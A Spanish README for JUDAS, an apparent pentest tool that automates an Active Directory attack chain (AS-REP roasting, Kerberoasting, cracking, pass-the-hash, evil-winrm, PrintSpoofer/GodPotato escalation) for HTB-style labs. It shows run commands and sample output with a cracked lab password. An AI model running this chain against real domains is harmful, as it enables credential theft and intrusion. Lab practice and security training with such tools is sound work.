<div align="center">

```
     ██╗██╗   ██╗██████╗  █████╗ ███████╗
     ██║██║   ██║██╔══██╗██╔══██╗██╔════╝
     ██║██║   ██║██║  ██║███████║███████╗
██   ██║██║   ██║██║  ██║██╔══██║╚════██║
╚█████╔╝╚██████╔╝██████╔╝██║  ██║███████║
 ╚════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
```

**AD Attack Chain Automation · OCD Mindmap 2025**

![Python](https://img.shields.io/badge/Python-3.10%2B-blue?style=flat-square&logo=python&logoColor=white)
![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)
![Platform](https://img.shields.io/badge/Platform-Linux-lightgrey?style=flat-square&logo=linux)
![Use](https://img.shields.io/badge/Use-HTB%20·%20THM%20·%20VulnHub-red?style=flat-square)

> **Solo para entornos controlados y autorizados: HackTheBox, TryHackMe, VulnHub y labs propios.**

</div>

---

## ¿Qué es JUDAS?

JUDAS automatiza la cadena completa de ataque sobre Active Directory en entornos de práctica. Basado en el **OCD Active Directory Attack Mindmap 2025**, ejecuta cada fase de forma secuencial, persiste el estado entre sesiones y al final entrega rutas de escalada priorizadas.

El flujo típico en una máquina HTB con AD:

```
nmap → RID brute → AS-REP Roasting → Kerberoasting → hashcat/john
     → netexec validate → evil-winrm → whoami /all + net group → escalada
```

Todo eso en un solo comando.

---

## Características

- **8 fases automatizadas** — Recon → Enum → AS-REP → Kerberoast → Crack → Validate → Post-enum → Analyze
- **Modo `--plan`** — Muestra la ruta de ataque OCD sin ejecutar nada (útil para planear antes de atacar)
- **Pass-the-Hash** — Soporte nativo con flag `--hash user:NThash`
- **Estado persistente** — Guarda progreso en `judas_state.json`; continúa con `--resume`
- **Análisis de privilegios** — Detecta SeImpersonatePrivilege, SeBackupPrivilege y más; sugiere PrintSpoofer, GodPotato, etc.
- **Análisis de grupos** — Domain Admins, Backup Operators, DnsAdmins, etc. con vectores específicos
- **OPSEC labels** — Cada paso indica su nivel de ruido (LOW / MEDIUM / HIGH)
- **Sin dependencias extra** — Solo Python 3.10+ y las tools de pentesting estándar

---

## Requisitos

```bash
# Python
python3 --version   # 3.10+

# Tools externas (instalar en Kali/Parrot/BlackArch)
sudo apt install nmap netexec impacket-scripts evil-winrm hashcat john bloodhound-python certipy-ad
```

| Tool | Uso |
|---|---|
| `nmap` | Port scan inicial |
| `netexec` | SMB/LDAP/WinRM enum y validación |
| `impacket-GetNPUsers` | AS-REP Roasting |
| `impacket-GetUserSPNs` | Kerberoasting |
| `impacket-secretsdump` | DCSync / dump de hashes |
| `evil-winrm` | Shell remota |
| `hashcat` / `john` | Cracking de hashes |
| `bloodhound-python` | Colección BloodHound |
| `certipy` | Enumeración ADCS (ESC1-8) |

---

## Uso rápido

### Cadena completa (modo automático)
```bash
python3 judas.py -t 10.10.10.175 -d egotistical-bank.local --auto
```

### Con lista de usuarios ya conocida
```bash
python3 judas.py -t 10.10.10.175 -d corp.local --users users.txt --auto
```

### Con credenciales conocidas (salta directamente al post-enum)
```bash
python3 judas.py -t 10.10.10.175 -d corp.local --creds 'jsmith:Password123' --auto
```

### Pass-the-Hash
```bash
python3 judas.py -t 10.10.10.175 -d corp.local --hash 'administrator:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c' --auto
```

### Reanudar sesión anterior
```bash
python3 judas.py --resume judas_output/judas_state.json
```

### Solo sugerencias (sin ejecutar nada)
```bash
python3 judas.py -t 10.10.10.175 -d corp.local --plan
```

### Forzar re-análisis de escalada
```bash
python3 judas.py --resume judas_output/judas_state.json --reanalyze
```

---

## Fases de ataque

| # | Fase | Herramientas |
|---|---|---|
| 1 | **Reconocimiento** | nmap, netexec smb (signing check) |
| 2 | **Enumeración de usuarios** | netexec RID brute, LDAP anónimo |
| 3 | **AS-REP Roasting** | impacket-GetNPUsers |
| 4 | **Kerberoasting** | impacket-GetUserSPNs |
| 5 | **Cracking** | hashcat (18200/13100), john |
| 6 | **Validación de credenciales** | netexec smb/winrm, PTH |
| 7 | **Enumeración post-acceso** | netexec + PowerShell (whoami, net group) |
| 8 | **Análisis y escalada** | Mapa de privilegios/grupos → vectores |

---

## Output

```
judas_output/
├── judas_state.json          # Estado completo (resume con --resume)
├── nmap.txt                  # Escaneo nmap
├── nmap_raw.txt              # Output raw de nmap
├── users.txt                 # Usuarios enumerados
├── asrep_hashes.txt          # Hashes AS-REP
├── kerb_hashes.txt           # Hashes Kerberoast
├── asrep.pot / kerb.pot      # Potfiles de hashcat
├── post_enum_combined.txt    # Output completo post-shell
├── smb_shares.txt            # Shares SMB accesibles
└── group_*.txt               # Miembros por grupo AD
```

---

## Ejemplo de output — HTB Sauna

```
[+] Puertos abiertos: [53, 80, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 5985]
[+] AS-REP hash: fsmith
[+] ¡Crackeadas! {'fsmith': 'Thestrokes23'}
[+] SMB ✓  fsmith:Thestrokes23
[+] WinRM ✓  fsmith:Thestrokes23

  evil-winrm -i 10.10.10.175 -u fsmith -p 'Thestrokes23'

[ALTO] SeImpersonatePrivilege → PrintSpoofer
  → PrintSpoofer64.exe -i -c cmd
[ALTO] SeImpersonatePrivilege → GodPotato
  → GodPotato.exe -cmd 'cmd /c whoami'
```

---

## Estructura del código

```
judas.py
├── JudasContext     — Estado compartido (dataclass + save/load JSON)
├── Runner           — Ejecutor de comandos (subprocess + shlex.quote)
├── JudasChain       — Lógica de fases (phase_recon → phase_analyze)
├── parsers          — parse_rid_users, parse_whoami_all, parse_open_ports, …
├── PRIV_ATTACKS     — Mapa privilegio → exploits sugeridos
├── GROUP_ATTACKS    — Mapa grupo → vector de escalada
└── run_plan_mode    — Modo solo-sugerencias basado en OCD Mindmap
```

---

## Aviso legal

Este software es exclusivamente para uso en entornos de práctica **controlados y autorizados** (HackTheBox, TryHackMe, VulnHub, laboratorios propios). El uso contra sistemas sin autorización explícita es ilegal. El autor no se hace responsable del mal uso de esta herramienta.

---

## Autor

**Yoandy Ramírez Delgado** · Junior Pentester · eJPTv2  
[![LinkedIn](https://img.shields.io/badge/LinkedIn-yoandyrd92-0A66C2?style=flat-square&logo=linkedin)](https://www.linkedin.com/in/yoandyrd92/)
[![HackTheBox](https://img.shields.io/badge/HTB-heindall-9FEF00?style=flat-square&logo=hackthebox&logoColor=black)](https://app.hackthebox.com/profile/heindall)
